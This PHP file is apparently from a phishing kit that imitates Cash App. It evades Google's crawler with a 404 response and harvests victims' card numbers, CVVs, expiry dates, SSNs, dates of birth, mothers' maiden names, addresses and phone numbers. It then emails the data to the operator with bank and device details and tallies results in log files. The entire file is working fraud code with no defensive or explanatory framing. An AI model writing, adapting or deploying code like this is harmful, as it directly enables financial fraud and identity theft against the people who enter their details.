<?php
ini_set( "display_errors", 0); 

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['oauth'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];

}
session_start();

error_reporting(0);
session_start();

require_once '../../main.php';
$cc = preg_replace('/\s/', '', $_POST['cnum']);
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "jcb"       => "/^35[0-9]{14}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else if (preg_match($cardtype['jcb'],$number))
    {
    $type= "jcb";
        return 'jcb';
    }
    else
    {
        return false;
    } 
 }


$_SESSION['ending'] = substr($_POST['ccnum'], -4);
$ip = getUserIP();
$bin = check_bin($_POST['cnum']);
$_SESSION['type_vbv'] = strtoupper($bin["scheme"]);
$_SESSION['type'] = strtoupper($bin["type"]);
$_SESSION['brand'] = strtoupper($bin["brand"]);
$mail = $_SESSION['email'];
$fn         = $_POST['fname'];
$alamat     = $_POST['address'];
$state      = $_POST['state'];
$cc         = $_POST['cnum'];
$exp        = $_POST['exp'];
$cvv        = $_POST['cvv'];
$zip        = $_POST['zip'];
$dob        = $_POST['dob'];
$phone      = $_POST['phone'];
$ssn        = $_POST['ssn']; 
$mmn        = $_POST['mmn']; 
$message   = "
#------------------------[ G-SPOT. Inc ]-----------------------------#
#--------------------[ ACCOUNT INFORMATION ]-------------------------#

Email           : ".$mail."

#--------------------[ CC INFORMATION]-------------------------#

Type			: ".strtoupper($bin["scheme"])." - ".strtoupper($bin["bank"]["name"])."
Level			: ".strtoupper($bin["brand"])."
Cardholders    : ".$fn."
CC Number		: ".$cc."
Expired		: ".$exp."
CVV : ".$cvv."

#-------------------------[ BILLING ADDRESS ]--------------------------------#

Full Name		      : ".$fn."
Address               : ".$alamat."
State                 : ".$state."
Zip                   : ".$zip."
DOB                   : ".$dob."
SSN                   : ".$ssn."
Phone                 : ".$phone."
Mother Maiden Name    : ".$mmn."

#------------------------[ DEVICE INFORMATION ]-----------------------#

IP Address  : ".$ip."
ISP		    : ".$ispuser."
Region		: ".$regionuser."
City		: ".$cityuser."
GMT         : ".$continent."
Timezone	: ".$timezone."
OS/Browser	: ".$os." / ".$br."
Date		: ".$date."
User Agent	: ".$user_agent."

#-----------------------[ きみ の こと が すき だから ]--------------------------#

";
$bins = preg_replace('/\s/', '', $_POST['cnum']);
$bins = substr($bins,0,6);

$from = $senderemail;
$headers = "From: $fn <$from>";
$subject = "".$bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [ ".$cn." - ".$os." - ".$ip." ] ";
$subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 

tulis_file("../../result/total_bin.txt","$subbin|$countrycode|$cn|$os\n");
$file = "../../result/total_cc.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);


